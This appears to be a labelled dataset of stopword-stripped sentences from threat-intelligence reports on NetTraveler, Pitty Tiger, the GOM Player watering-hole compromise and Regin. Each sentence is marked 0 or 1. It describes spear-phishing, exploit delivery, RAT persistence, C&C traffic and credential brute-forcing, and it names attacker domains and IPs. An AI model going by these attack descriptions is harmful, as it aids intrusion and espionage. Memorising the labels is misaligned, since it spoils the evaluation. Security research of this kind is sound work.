We written NetTraveler HERE HERE	0
Earlier year observed uptick number attacks Uyghur Tibetan supporters using updated version NetTraveler backdoor	0
Here 's example targeted spear-phishing e-mail directed Uyghur activists March 2014	1
The e-mail two attachments non-malicious JPG file 373 KB Microsoft Word .DOC file	1
The .DOC	0
file reality '' Single File Web Page '' container also known '' Web archive file '' appears created system using Microsoft Office - Simplified Chinese	0
It contains exploit CVE-2012-0158 vulnerability detected Kaspersky Lab products Exploit.MSWord.CVE-2012-0158.db	0
If run vulnerable version Microsoft Office drops main module '' net.exe '' ( detected Kaspersky Lab products Trojan-Dropper.Win32.Agent.lifr ) turn installs number files	1
The main C & C module dumped '' % SystemRoot % \system32\Windowsupdataney.dll '' ( detected Kaspersky Trojan- Spy.Win32.TravNet.qfr )	1
It registered service ( named '' Windowsupdata '' ) Windows Batch file named '' DOT.BAT '' ( detected Kaspersky Lab products Trojan.BAT.Tiny.b ) To make sure malware n't running multiple times uses mutex '' SD2013 Is Running '' mark presence system	1
Other known mutexes used older current variants include The malware configuration file written '' SYSTEM '' folder ( opposed SYSTEM32 ) slightly new format compared '' older '' NetTraveler samples For record 's older NetTraveler config file looks like Obviously developers behind NetTraveler taken steps try hide malware 's configuration	1
Luckily encryption relatively simple break	0
The algorithm follows Once decrypted new config looks like One easily see command-and-control ( C & C ) server screenshot '' uyghurinfo [ ] com ''	1
We identified several samples using new encryption scheme	0
A list extracted C & C servers found We recommend blocking hosts firewall	0
This year actors behind NetTraveler celebrate 10 years activity	0
Although earliest samples seen appear compiled 2005 certain indicators point 2004 year activity started	0
For 10 years NetTraveler targeting various sectors focus diplomatic government military targets	0
Most recently main focus interest cyber-espionage activities revolved around space exploration nano-technology energy production nuclear power lasers medicine communications	0
The targeting Uyghur Tibetan activists remains standard component activities assume stay way perhaps another 10 years	0
Cyber espionage hot topic last years	0
Computer attacks known '' APT '' ( Advanced Persistent Threat ) become widely reported emphasized media damages considered real strategic trends moving cyber defense	0
AIRBUS Defence & Space – CyberSecurity unit responds attacks customers every day developing complete range solutions	0
Today decided release publicly information specific group APT attackers known '' Pitty Tiger ''	0
This information comes directly investigations led Threat Intelligence	0
Pitty Tiger group attackers active since least 2011	0
They targeted private companies several sectors defense telecommunications also least one government	0
We able track group attackers provide detailed information	0
We able collect reveal '' malware arsenal ''	0
We also analyzed technical organization	0
Our investigations indicate Pitty Tiger used 0day vulnerability far rather prefer using custom malware developed group 's exclusive usage	0
Our discoveries indicate Pitty Tiger group attackers ability stay radar yet still mature groups attackers monitor	0
Pitty Tiger probably state-sponsored group attackers	0
They lack experience financial support one would expect state-sponsored attackers	0
We suppose group opportunistic sells services probable competitors targets private sector	0
We able leverage several attackers profiles showing Pitty Tiger group fairly small compared APT groups probably saw work limited amount targets	0
At end report provide indicators compromise help people detect current Pitty Tiger attacks	0
APT attacks follow call '' APT kill chain ''	0
The kill chain describes briefly way attackers perform actions	0
It summarized following scheme The reconnaissance phase commences attacker selects new target involves acquisition information target	0
There little information available phase little data	0
The way collect information phase would already monitor attackers ' actions step hardly feasible	0
The longer attackers spend time attempting understand target online presence easier find efficient ways penetrate company 's systems	0
This reconnaissance phase finding information break targeted network successfully searching data could help accelerate sensitive information isolation ( like name key employee example )	0
This phase mostly relies open sources Internet social networks press releases white papers corporate websites search engines also active tools like vulnerability scanners etc	0
At stage APT attackers solid knowledge target key employees	0
The attackers everything need start looking entry point company 's network establish one several permanent backdoors environment	1
The attackers mostly rely two techniques infect one several computers usually workstations inside target 's network spear phishing drive-by downloads	1
Spear phishing described targeted e-mail phishing	1
In spear phishing scheme attackers send e-mails targeted people	1
In fact even send single e-mail	0
The trick target right victim provide right content click link leading drive-by download malware open attached file infect computer	1
Some groups attackers also use '' watering hole '' techniques successfully compromise targets	1
To build watering hole attack attackers compromise website third party generally supplier target typically visited specific group professionals likely target	1
Every visitor compromised third party infected	1
The method one major drawback also infect third parties visit website	0
Attackers developed ways avoid	0
If reconnaissance phase done effectively already know IP ranges used target company	0
It takes lines code infecting script compromise visitors coming target IP ranges	1
Direct attacks servers target also way penetrate target 's network	0
Attackers gained access one several machines inside target 's corporate network	1
They need install several different backdoors order able always access network	1
In case one backdoor falls others	0
As soon attackers sure enough access start looking two things intellectual property ( anything else want know steal ) alignment predefined mission objectives means privilege escalation facilitate lateral movement within compromised environment	1
It generally take long attackers gain domain administrator privileges dump Active Directory content	1
They use lateral moves machines inside network look everything need	0
This step hard detect since use valid credentials legitimate administration tools PsExec	0
Data exfiltration last step attackers loop lateral moves step never-ending circle prolonged access information theft	1
They generally create archive files containing content want exfiltrate sent attackers using remote administration tool ( RAT ) transfer protocols FTP HTTP	1
This phase end APT attack	0
The attackers loop access strengthening/lateral moves stage generally keep stealing information stay inside network data gathering	1
For information APT phases please refer APT Kill Chain blog post serie	0
During regular investigations APT cases one particular variant malware caught attention faced	0
We decided spend time investigate around malware found used exclusively single group attackers	0
This malware family known '' PittyTiger '' anti-virus research community	0
We discovered malware sample June 2014 leading command & control ( c & c ) server still activity	1
Our researches around particular malware family revealed '' Pitty Tiger '' group active since 2011 yet found publications could probably attributed group attacker back 2010	0
This group uses malware tools APT operations addition PittyTiger RAT	0
A variant infamous Gh0st RAT dubbed '' Paladin '' used repeatedly PT group together RATs seem developed exclusively PT group '' MM RAT '' ( aka Troj/Goldsun-B ) '' CT RAT ''	0
Another variant Gh0st RAT named '' Leo '' found inactive c & c server	0
We also found another malware named '' Troj/ReRol.A ''	0
This one also used group infect workstations collect system information install malware infected computer	1
It acts first stage downloader system data collector often used initial compromise Pitty Tiger campaigns generally embedded Microsoft Office documents	1
Thanks server 's misconfigurations managed get information three c & c servers used group attackers provided us insight end 2013 beginning July 2014	1
Our investigation focused data could get c & c servers also Pitty Tiger environment	0
This whitepaper aims expose view group especially infrastructure capabilities	0
We hope publication bring counter analysis research community enrich global common threat knowledge	0
Pitty Tiger like APT groups use spear phishing e-mails extensively order gain initial foothold within targeted environment	1
We able find spear phishing e-mail crafted attackers	1
This e-mail spoofed identity employee targeted company The attached file Microsoft Office Word document triggering CVE-2014-1761 infect computer sent While example looks '' amateur '' spear phishing attempt suppose group conducted advanced spear phishing campaigns based fact found infected Word documents showing content stolen victims group	1
These documents infecting system Troj/ReRol.A malware detail later report	1
This could mean Pitty Tiger group using stolen material spear phishing content either target persons compromised company target persons competitor's company generally compromise another target	1
Pitty Tiger also seem use fake Microsoft Office Excel content yet could find empty content delivering Troj/ReRol.A malware	1
Although able find evidences attack aimed exploiting vulnerabilities group 's targets servers able record several vulnerability scanning launched one c & c server straight targets	1
The attackers using different vulnerability scanners aimed targets	1
While targets scanned '' generic '' vulnerability scanning tools like HScan Fluxay port scanners like Nmap targets scanned specific vulnerabilities like ZyWALL vulnerability FORTINET product	1
We also able testify Pitty Tiger group successfully collected information targets exploiting HeartBleed bug	1
This vulnerability exists old versions OpenSSL allows attackers collect data chunks memory targeted machine	1
It allowed Pitty Tiger group get admin credentials least one target example	1
Running automated vulnerability scanners whole ranges IP addresses used targets several domains noisy way collect information find server vulnerabilities	1
We would advocate method unwise want stay furtive c & c server surprising say least	0
While Pitty Tiger group experienced aspects running APT campaigns definitely lacks maturity	0
One favorite methods used Pitty Tiger group infect users use Microsoft Office Word document exploits specific vulnerability	1
The payload infecting system malware known '' Troj/ReRol.A ''	1
It generally first step initial compromise Pitty Tiger campaigns	0
We able find one document used group attacker exploiting CVE- 2012-0158 old critical vulnerability impacting Microsoft Office corrected Microsoft's MS12-027 fix April 2012	1
This vulnerability affects Microsoft Office versions Office 2010	0
We also found one RTF document embedding CVE-2014-1761 recent exploit	1
We discovered several different documents spreading malware triggering CVE-2012-0158 vulnerability yet could share report since documents contain information victims Pitty Tiger group	1
The discovery '' old '' vulnerability exploitation June 2014 could mean Pitty Tiger group direct access 0day exploits enough budgets buy	0
It could also mean use low range exploit default working targets sufficient compromise workstations	0
The Word document initially found probably '' test '' document used group	0
When opened shows single line written Chinese language translated '' Hello '' When successfully triggered exploit infects host dropping executing file named '' svohost.exe '' temporary folder currently logged-in user This binary '' Troj/ReRol.A '' according Sophos naming convention	1
It immediately triggers alarms sandbox The binary drops copy Application Data folder currently logged-in user The malware initiates communication time.windows.com check connectivity communicates c & c server mac.avstore.com.tw	1
Very variants Troj/ReRol.A public	0
The variants seen use User- Agent The persistence mechanism used malware creation registry key named '' Shell '' containing path malware infected system The payload malware used collect information newly infected host send back c & c server	1
It also download execute binaries	1
The data sent POST request 0x11 bytes header consisting fixed-value byte ( 0xc3 ) followed 0x10 bytes encryption key	1
The data following header encrypted using RC4 previous key	1
Once data deciphered last byte clear text also 0xc3	0
We able decrypt communications confirmed transmitted c & c server	0
Here anonymized sample communication showing information collected malware This information useful attacker shows software installed system running services	1
Once data transferred c & c server responds sending additional malware execute machine	1
The c & c part consists two files The dr.asp registers following keywords These two binaries longer available server	0
However found various files could used '' 32.exe '' past The 322.exe file legitimate Chinese calc.exe tool	0
It might used attackers perform tests	0
The 3 others binaries RATs detailed next parts	0
This RAT origin attackers ' group name	0
'' PittyTiger '' mutex used malware	0
'' Pitty Tiger '' also string transmitted network communications RAT see chapter	0
The malware running sandbox triggers following alarms The binary drops two files '' C \Windows\System32 '' The '' qmgrxp.exe '' binary simple copy original binary	1
It drops '' packet64.dll '' injects '' explorer.exe ''	1
When executed mutex called '' PittyTiger '' created	1
Persistence achieved adding path binary WinlogonUserInit key The '' packet64.dll '' main payload RAT	1
After injected starts sending Hello packet c & c server All requests sent c & c contains string '' /FC001/ '' followed bot id	1
This id consists infected computer name followed dash lower word disk serial id	0
The data sent simply encoded using base64 cipher	1
The hello packet decoded looks like following Our sample 3 c & c servers configured The following commands implemented Regarding controller part found two different versions The interface handling Pitty TIGER CT connections interesting	1
We able confirm author two families malware person seen next chapter '' CT RAT ''	0
This remote administration tool often used Pitty Tiger group	1
We able acquire client server parts	0
We found two instances binary different names – 32mm.exe mm32.exe	0
This RAT seems evolution PittyTiger since specific server binary found could handle requests CT PittyTiger indicated compatible PittyTiger	0
Moreover commands implemented RATs	1
Unsurprisingly running sandbox RAT triggers alarms PittyTiger The binary drops two files '' C \Program Files\Internet Explorer '' The '' ieupdate.exe '' simple binary inject DLL '' explorer.exe ''	1
Persistence achieved via following registry key After injection RAT sends first login packet c & c The RAT communication performed HTTP requests	1
The data sent encrypted RC4 base64-encoded	1
The RC4 key Unicode form requested URL	0
The Login packet contains following string decoding deciphering It contains computer name user name internal IP address OS version RAT internal version Language ID system	1
The RAT receive commands c & c	1
Usual RAT features implemented Regarding configuration sample communicates '' sop.avstore.com.tw '' contains string '' Nov 13 2013 '' version identifier	1
The c & c part Windows binary written .NET	0
	0
We found 2 versions The About form gives name developer ( ) The version controller handle PittyTiger CT shows author ( ) As screenshots show switch PittyTiger CT probably last semester 2013	0
The text translated thanks Google Translate Further discussion author provided subsequent sections	0
We named malware '' MM RAT '' beginning investigation found existing name '' Troj/Goldsun-B '' according Sophos	0
This another remote administration tool often used Pitty Tiger crew	1
We able acquire client server part	0
The binary found named 3200.exe triggers following alarms sandbox The '' release.tmp '' file dropped system The binary also copied user 's '' Application Data '' directory injects '' release.tmp '' file '' explorer.exe ''	1
Persistence achieved adding path binary Winlogon Shell key The RAT embeds DNS server IP addresses make c & c domain names resolutions	1
These addresses listed It starts resolving domains injection immediately sends requests	1
First requests used check updates ( GET request /httpdocs/update/update.ini )	1
A Hello packet sent The bot repeatedly sends GET requests '' /httpdocs/mm/ botid /ComMand.sec '' retrieve remote commands	1
The communication protocol quite simple GET requests used receive data c & c POST requests send data	1
In POST commands CGI name represents command	1
The following features implemented The following CGI files requested bot The configuration stored locally file called '' schmup.sys ''	1
The file ciphered using RC4 using MD5 hash '' rEdstArs '' key	1
Our sample uses '' mca.avstore.com.tw '' '' star.yamn.net '' '' bz.kimoo.com.tw '' c & c servers	1
It contains '' 1.6.0 '' version number uses password '' 9ol.8ik '' authenticate bots	0
Unlike others c & c binaries c & c part RAT graphical interface remotely requested manage bots	1
Furthermore authentication required send commands c & c ( need know configured password interact bots )	1
The management protocol bots protocol different CGI files The bots ' answers remote commands retrieved requesting '' Reply.sec '' file ( e.g	0
GET /httpdocs/mm/ botid /Reply.sec ) These network patterns might ring bells researcher 's minds	0
The network communication used binary used Enfal malware used past Lurid group ( APT attackers ) threat actors China	0
An examination code reveal code similarities Enfal malware	0
We currently know malware uses patterns communicate	1
This another remote administration tool used Pitty Tiger group	1
We able get client server part	0
The binary found dropped malicious Word document	1
The following alarms triggered sandbox The shellcode contained Word file drops following file executes This one drops turn following file This tmp file copied '' C \Windows\system32\Nwsapagentex.dll '' registered service called '' Nwsapagent ''	1
This malware variant infamous Gh0st RAT	0
Our specific sample uses '' ssss0 '' instead usual '' Gh0st '' header network communications	0
The commands ID used communication protocol also changed features quite	0
The configuration directly embedded binary deciphered runtime	0
Up 5 c & c servers configured sample one '' ey.avstore.com.tw:53 ''	1
'' EY '' could stand '' Ernst & Young ''	0
It would surprising since lot different attack groups use anti-virus vendors big company 's names try look legitimate	0
Pitty Tiger exception detailed later report	0
We also found two c & c binaries claiming versions 2.1 2.2 Paladin RAT controller	0
Version 2.1 answers '' ssss0 '' header version 2.2 uses classical '' Gh0st '' header	0
Additionally Paladin RAT found another variant Gh0st RAT named '' Leo ''	0
Although found c & c server group evidence used group opposition Paladin used often Pitty Tiger	0
Moreover built malware found folder configured connect local IP address probably testing purposes	1
Our investigation focused three particular c & c servers used group	0
These c & c servers unlike c & cs used group misconfigured	0
Once parsed dumped provided us insight	0
We found several domains used Pitty Tiger group interesting ones detailed chapter	0
Pitty Tiger like APT attackers often use anti-virus '' familiar names '' registering domains creating subdomains	0
Some examples avstore.com.tw sophos.skypetm.com.tw symantecs.com.tw trendmicro.org.tw etc	0
The registration information domain since 2013-06-04 This information used register another domain skypetm.com.tw also used Pitty Tiger group	0
Our research also led us discovery four different malware families connected subdomains avstore.com.tw This domain shown two different WHOIS entries time The recent registration information also used avstore.com.tw	0
Six malware families identified communicating subdomains skypetm.com.tw Avstore.com.tw skypetm.com.tw 4 malware families common communicating subdomains domains Some domains registered group old	1
There increase registrations 2010	0
All e-mail addresses used connected Pitty Tiger group	0
Mapping victims targeted campaign easy task	0
We found Pitty Tiger group active one particular private company defense industry one academic network government yet think done used proxy group 's operations	0
We also found connections companies c & c servers yet find evidence real victims	0
These alleged victims work different sectors located mostly European countries	0
It might surprising see company specialized web development yet built websites interesting potential targets	0
We suspect Pitty Tiger use compromise spear phish companies commercial relation web development company	1
We mention access three several attackers ' servers	0
Therefore suppose Pitty Tiger group could targets could confirm	0
We also found lot vulnerability scanners launched attackers different targets yet sign compromise	1
During course investigations discovered RAR archive attacker 's server containing 5 Word documents one small C source code	0
These documents belong defense company compromised	0
According name files general feel archive think extracted attackers '' show '' someone kind data could get compromise particular target	1
The documents still exhibiting comments various users showing ongoing work old documents	0
Interestingly enough saw part documents appear Virus-Total additional '' gift '' attackers payload dropping malware	1
There two options think  Someone company targeted document	1
 Someone another company targeted document	1
This company could partner competitor	0
Since unable determine intended use specific document suppose could used provide commercial advantages competitors company used foreign state	0
During investigation found interesting information Pitty Tiger group	0
After analyzing various collected elements tried draw portrait particular threat	0
We able get RDP connections logs one c & c server These connections either VPS dynamic IP addresses mostly China	0
A computer named CHMXY-PC connected c & c via RDP IP address 58.61.40.5	1
The IP ADSL dynamic pool Gangzhou area ( Guangdong province ) A connections c & c done computer named TIEWEISHIPC IP address 27.16.139.143	1
This IP address belongs ADSL dynamic pool Wuhan area ( Hubei's provincial capital )	0
Some connections c & c originated computer named FLY-THINK several IP addresses located Fuqing ( Fujian province )	1
The IP addresses ADSL dynamic pool Most connections c & c server coming computer named 50PZ80C- 1DFDCB8 several IP addresses	1
There 11 IP addresses Chinese dynamic ADSL ranges 9 Fuqing ( Fujian province ) one Fuzhou ( Fujian 's province capital ) one Nanchang ( Jiangxi 's province capital )	0
The last one came VPS instance located Los Angeles ( California USA ) purchased China based VPS provider XeVPS belong AS38197 ( Sun Network Hong Kong Limited )	0
The two computers FLY-THINK 50PZ80C-1DFDCB8 used distinct IP addresses connect c & c yet IP addresses come IP range We mapped RDP connections graphical view We found member group attackers used tools system testing purposes	1
This information still available got access c & c server	0
He launched tests CT RAT exposed earlier Here see user '' Toot '' machine named '' toot-2a601225a8 '' logging CT RAT executing commands	1
The c & c IP address 198.100.113.27 seen	0
Other log files showed '' Toot '' using virtual machines tests	0
We also see system Microsoft Windows XP SP3	0
The '' P '' field language ID	0
1028 means '' Chinese traditional ''	0
We also seen tests run '' toot '' language ID 2052 '' Chinese simplified ''	0
The '' M '' field probably used versioning	0
It hardcoded string binary	0
After tests could see real connections victim using RAT	1
Here follow-up commands launched bot controller standard command-line shell The attacker goes like using tools ends communication RAT computer	0
Please note point attacker least privileges local administrator since allowed write content system32 folder Windows XP system	1
He could also gain credentials sensitive e-mail account	1
In addition information already shown saw Toot connect account cloud service named '' Baidu Drive ''	0
The e-mail address linked account dyanmips @ qq.com ( QQ-ID 2589315828 )	0
We could find traces two e-mail accounts associated Toot ciscodyanmips @ qq.com ( QQ ID 204156335 ) ciscodynamips @ qq.com ( QQ ID 1878836793 )	0
We find information user '' Toot '' yet miss Chinese language capabilities	0
The controller part CT RAT/PittyTiger RAT revealed following '' '' information translated Chinese English language CT console ( compatible pittytiger ) v1.3 2013.12 Trees snow We believe translation author 's name might accurate due use automated translation tools	0
Moreover strong suspicions single individual nicknamed '' Trees snow '' rather two programmers nicknamed '' Trees '' '' Snow ''	0
'' Trees '' could also '' Cold ''	0
We noticed symbol word translated differently according context used	0
Once lack Chinese language skills	0
We identify two nicknames current campaign Automn Snow ( 秋雪 ) Cold Air Kiss ( 风吻寒 )	0
While confident people indeed developers PittyTiger CT RAT malware sure belong PittyTiger group	0
These developers might hired develop RATs	0
They might also selling PittyTiger group	0
There trace usage attacking groups believe PittyTiger RAT exclusively used group attackers	0
According indicators gathered threat activities profiling hypothesis way group conducting operations	0
We strong evidence bot operator position	0
We identify one nickname position user known TooT	0
As see nickname think TooT one person group persons	0
We also identified malware development position	0
We identified two nicknames position current campaign Automn Snow ( 秋雪 ) Cold Air Kiss ( 风吻寒 )	0
Yet unsure belong group might third party providing selling malware	0
We strong suspicion coordinator position coordinates bot operator provides logistics support ( weaponized document tools… ) reviews programmers work	0
This position could imply communication channel another manager	0
We named position 'Chen ' relation several references common Chinese name c & c WHOIS investigation materials	0
We suspicion customer relationship manager position may act interface customer Chen	0
We named position 'Lilly '	0
The c & c servers used attackers revealed lot interesting files stored various folders This quite usual arsenal group APT attackers What rare find controller part tools	1
We lucky enough get controller part Pitty Tiger CT RAT even get kind hybrid controller made CT RAT also supporting Pitty Tiger	0
We suppose CT RAT new evolution Pitty Tiger replace Pitty Tiger following months	0
The presence Chinese version '' calc.exe '' official calculator provided Microsoft Windows interesting	0
Not one indicator probable Chinese origin also indicator server probably used test base addition operational controlling infected machines different targets	1
In addition tools found interesting scripts	0
A script named ipc.bat uses file named user.txt try brute-force shared folder access The user.txt file contains thousands lines one couple one particular username one password attempt This user.txt file anonymized yet wanted give feel	1
This file 67320 lines long uses 5610 different passwords 12 users contained file	0
The user names clearly result user enumeration dedicated particular French victim	0
The passwords listed file either build several campaigns current campaign	0
A lot passwords related targeted company might previous passwords users	0
We also discovered pack files used trigger Internet Explorer vulnerability ( CVE-2014-0322 )	0
The date files namely Tope.swf index.html 2014/02/18 days revelation existing exploits wild used APT attacks	0
We know Pitty Tiger group used exploit found trace indicating	0
A lot different attackers seem used vulnerability since	0
Determining exactly behind APT campaign difficult	0
We tried extract different technical indicators together contextual elements	0
Information relating tools used attackers leveraged attribution The IP addresses used hosting c & c domains mainly located Taipei ( Taïwan ) Hong Kong City ( Hong Kong Special Administrative Region PRC ) Most RDP connections c & c infrastructure come Chinese IP ranges Fuqing ( Fujian province PRC )	1
Yet IP addresses USA Hong Kong also found ; All items listed chapter strong indicators attackers might Chinese	0
Pitty Tiger group attackers active since least 2011	0
Pitty Tiger effective mature use targeted malware use known exploits infect computers malware creation infrastructure efficiently conduct APT attacks	1
They quite unprofessional way using infrastructure launch vulnerability scanners directly c & c server also use connection personal activities ( downloading pornographic material example seen whole folder c & c server full xxx torrent links )	1
Pitty Tiger probably state-sponsored group attackers	0
The attackers lack experience financial support one would expect state-sponsored attackers	0
We suppose group opportunistic sells services probable competitors targets private sector	0
One governmental network targeted group yet evidence purpose attack	0
We suppose particular attack executed provide usable bounce group	0
The campaign studied largely focused one particular target	0
We suspect Pitty Tiger group work according opportunistic business model group might offer services third parties private sector	0
This group seems small compared APT groups	0
We leveraged several profiles could identify attackers certain extent	0
We believe group might keep working limited budgets grow extend attacking campaign capabilities	0
This list indicators provided order help people detect Pitty Tiger APT campaign	0
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting Traffic Light Protocol ( TLP ) method classifying document order promote distribution sensitive information individuals organisations communities controlled trusted way based originator 's wishes	0
The various levels TLP represented following colours Sources may use TLP RED information effectively acted upon additional parties could lead impacts party 's privacy reputation operations misused	0
Recipients may share TLP RED information parties outside specific exchange meeting conversation originally disclosed	0
TLP RED information passed verbally person	0
Sources may use TLP AMBER information requires support effectively acted upon carries risks privacy reputation operations shared outside organisations involved	0
Recipients may share TLP AMBER information members organisation need know widely necessary act information	0
Sources may use TLP GREEN information useful awareness participating organisations well peers within broader community sector	0
Recipients may share TLP GREEN information peers partner organisations within sector community via publicly accessible channels publication posting publicly Internet	0
Sources may use TLP WHITE information carries minimal foreseeable risk misuse accordance applicable rules procedures public release	0
Subject standard copyright rules TLP WHITE information may distributed freely without restriction	0
On 2nd January 2014 Systems Administrator Monju fast breeder reactor facility Japan noticed suspicious connections emanating machine control room coinciding seemingly routine software update free media player	0
Among items staff training documents 40,000 emails stored machine thought harvested attacker	1
The Japanese Atomic Energy Agency investigating	0
The attack appears result attackers compromised 'GOM Player ' update server act 'watering hole ' meaning machines access site delivered malware	1
Gom Player originates South Korea parts Asia popular alternative Windows Media Player	0
It unclear whether every machine trying download update received malware whether machines fitted certain profile infected	0
Technical analysis implant compromised machine shown variant Trojan wild years continues effective	1
The 'Gh0st RAT ' used extensively attacks linked Chinese state though important remember code publicly available modified used anyone	0
The targeting Japanese nuclear facility however consistent Chinese state intelligence requirements	0
If work Chinese group feel targeting may go much Civil Nuclear sector thus interest wider Energy Sector industry whole	0
In order inform Energy Sector beyond attack compiled technical summary attack provided number Indicators Of Compromise ( IOCs ) used aid detection	0
It likely attackers would redeploy implant targets albeit delivery mechanism tailored location intended victims	0
Based open source reporting appears intrusion took place via compromise GOM Player update server ( app.gomlab.com ) attackers may gained entry via PHP-based webshell hidden within image present host since October 2011	1
The observed malicious activity relates modification file controls GOM Player updates spanning date range 27th December 2013 16th January 2014 time alterations reported manifested visitors certain IP ranges ; evidence supporting claim yet made public	1
If indeed case nature attack certainly targeted one would cover entire userbase GOM Player product victims comprising Japanese Government addition Monju nuclear facility	0
The modified file redirected GOM Player update process another compromised server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) file containing legitimate update malware deliver victim	1
Deployed system via compressed bundle containing official GOM Player setup binary self-extracting RAR archive containing malicious files malware consists number individual pieces	1
Upon extraction RAR archive installer component ( 0ae82fd94836815a1e8d284ccb75109d ) automatically launched alongside GOM Player update distracting victims malicious activity taking place	1
The installer component referred author 'miansha ' according East Asia Cyber Threat Intelligence Researcher likely Miǎnshā ( 免杀 ) phrase commonly used People 's Republic China ( PRC ) hackers mean 'anti Antivirus detection ' 'Antivirus avoidance ' ; Symantec named detection code 'Backdoor.Miancha ' Miǎnchá ( 免查 likely shorthand 免杀查 ) similarly means 'Antivirus avoidance '	1
The installer responsible malware persistence mechanism adding entries registry following locations depending Windows Version The installer also determine system architecture ( 32- 64-bit ) deobfuscate relevant loader DLL path 'C \Windows\temp\install.ocx ' ensuring malware launched system start-up	1
Oddly file padded null bytes resulting 25 megabyte file	0
The main implant code stored files named instructions.pdf instructions64.pdf ; PDF documents instead DLLs obfuscated one-byte XOR 0x14 similar malware loader DLLs	1
The loader referred malware author 壳 ( shell ) reads deobfuscates main implant code communicates attacker-controlled server testqweasd.tk ( 211.43.220.89 ) TCP port 443	1
The main implant code referred 白加黑 ( 'Black White ' ) term used PRC hacking community denote act Antivirus avoidance loading malicious 'black ' code via non-malicious trusted 'white ' code	1
This practice recently illustrated deployment PlugX trojan utilising DLL load order hijacking alongside signed ( trusted ) executable	1
Analysis malware revealed variant Gh0st RAT often used Chinese actors ( including state-motivated directly state-sponsored )	0
This specific variant shows similarities used VOHO campaign Gh0st RAT spread via watering hole attacks utilising vulnerable websites belonging financial services technology companies	1
Specifically initial five bytes communications ( often used denote campaign victim ) 'HTTPS ' amended original 'Gh0st ' ; traffic produced VOHO Gh0st variant	0
In addition delivering system-specific details back attacker Gh0st RAT provides capability deploy additional malware enabling harvesting sensitive data enabling propagation throughout infected network	1
In world malware threats rare examples truly considered groundbreaking almost peerless	0
What seen Regin class malware	0
Regin extremely complex piece software customized wide range different capabilities deployed depending target	1
It built framework designed sustain long-term intelligence-gathering operations remaining radar	1
It goes extraordinary lengths conceal activities compromised computers	1
Its stealth combines many advanced techniques ever seen use	0
The main purpose Regin intelligence gathering implicated data collection operations government organizations infrastructure operators businesses academics private individuals	1
The level sophistication complexity Regin suggests development threat could taken well-resourced teams developers many months years develop maintain	0
Regin multi-staged modular threat meaning number components depending others perform attack operations	0
This modular approach gives flexibility threat operators load custom features tailored individual targets required	0
Some custom payloads advanced exhibit high degree expertise specialist sectors	0
The modular design also makes analysis threat difficult components must available order fully understand	1
This modular approach seen sophisticated malware families Flamer Weevil ( The Mask ) multi-stage loading architecture similar seen Duqu/Stuxnet family threats	0
Regin different commonly referred '' traditional '' advanced persistent threats ( APTs ) techniques ultimate purpose	0
APTs typically seek specific information usually intellectual property	1
Regin 's purpose different	0
It used collection data continuous monitoring targeted organizations individuals	1
This report provides technical analysis Regin based number identified samples components	0
This analysis illustrates Regin 's architecture many payloads disposal	0
Regin multi-purpose data collection tool dates back several years	0
Symantec first began looking threat fall 2013	0
Multiple versions Regin found wild targeting several corporations institutions academics individuals	0
Regin wide range standard capabilities particularly around monitoring targets stealing data	1
It also ability load custom features tailored individual targets	0
Some Regin 's custom payloads point high level specialist knowledge particular sectors telecoms infrastructure software part developers	0
Regin capable installing large number additional payloads highly customized targeted computer	1
The threat 's standard capabilities include several remote access Trojan ( RAT ) features capturing screenshots taking control mouse 's point-and-click functions	1
Regin also configured steal passwords monitor network traffic gather information processes memory utilization	1
It also scan deleted files infected computer retrieve	1
More advanced payload modules designed specific goals mind also found investigations	0
For example one module designed monitor network traffic Microsoft Internet Information Services ( IIS ) web servers another designed collect administration traffic mobile telephony base station controllers another created specifically parsing mail Exchange databases	1
Regin goes lengths hide data stealing	1
Valuable target data often written disk	1
In cases Symantec able retrieve threat samples files containing stolen data	0
Symantec aware two distinct versions Regin	0
Version 1.0 appears used least 2008 2011	0
Version 2.0 used 2013 onwards though may possibly used earlier	0
Version 1.0 appears abruptly withdrawn circulation 2011	0
Version 1.0 samples found date seem improperly removed longer accessible attackers removal	0
This report based primarily analysis Regin version 1.0	0
We also touch version 2.0 recovered 64-bit files	0
Symantec assigned version identifiers two versions acquired	0
Regin likely two versions	0
There may versions prior 1.0 versions 1.0 2.0	0
The Regin operators appear focus specific industry sector	0
Regin infections observed variety organizations including private companies government entities research institutes	0
Infections also geographically diverse identified mainly 10 different regions	0
The infection vector varies among targets	0
A reproducible infection vector unconfirmed time writing	0
Targets may tricked visiting spoofed versions well- known websites threat may installed web browser exploiting application	1
On one computer log files show Regin originated Yahoo Instant Messenger unconfirmed exploit	1
Regin six-stage architecture	0
The initial stages involve installation configuration threat 's internal services	1
The later stages bring Regin 's main payloads play	0
This section presents brief overview format purpose stage	0
The interesting stages executables data files stored Stages 4 5	0
The initial Stage 1 driver plainly visible code computer	0
All stages stored encrypted data blobs file within non-traditional file storage area registry extended attributes raw sectors end disk	1
Symantec Security Response obtained Regin dropper time writing	0
Symantec believes dropper executed target 's computer install execute Stage 1	1
It 's likely Stage 0 responsible setting various extended attributes and/or registry keys values hold encoded versions stages 2 3 potentially stages 4 onwards	1
The dropper could transient rather acting executable file may possibly part infection vector exploit code	0
Stage 1 initial load point threat	1
There two known Stage 1 file names These kernel drivers load execute Stage 2	1
These kernel drivers may registered system service may associated registry key load driver computer starting	1
Stage 1 simply reads executes Stage 2 set NTFS extended attributes	1
If extended attributes found Stage 2 executed set registry keys	1
Stage 2 kernel driver simply extracts installs runs Stage 3	1
Stage 2 stored traditional file system encrypted within extended attribute registry key blob	1
Stage 2 found encrypted This stage also hide running instances Stage 1	1
Once happens remaining plainly visible code artifacts	0
Similar previous stages Stage 2 finds loads encrypted version Stage 3 either NTFS extended attributes registry key blob	1
Stage 2 also monitor state threat	1
This stage drops file msrdc64.dat appears always 512 bytes size	1
The first two bytes used remaining bytes set zero	0
The second byte indicates exclusive maximum number instances allowed run set two	0
This means one instance run time	0
The first byte indicates many instances run attempted run	0
Therefore potential combinations first two bytes Stage 3 kernel mode DLL stored traditional file system	0
Instead file encrypted within extended attribute registry key blob	1
Stage 3 found following locations The file six seven times size driver Stage 2	0
In addition loading executing Stage 4 Stage 3 offers framework higher level stages	1
Stages 3 based modular framework code modules	0
These modules offer functions private custom interface	0
Each file stages 3 '' export '' functionality parts Regin	0
In case Stage 3 following primitives offered These primitives provided custom export methodology	0
The Stage 3 DLL exports wide range functionality custom export methodology	0
The interface used export functionality make use traditional Windows DLL export mechanism name ordinal	0
Exported Regin methods referenced tuple consisting major minor number	0
Stage 3 exports hundreds methods organized 12 different major groups	0
The numbers used vary across versions	0
We acquired artifacts using two different numbering schemes	0
Table 2 example listing	0
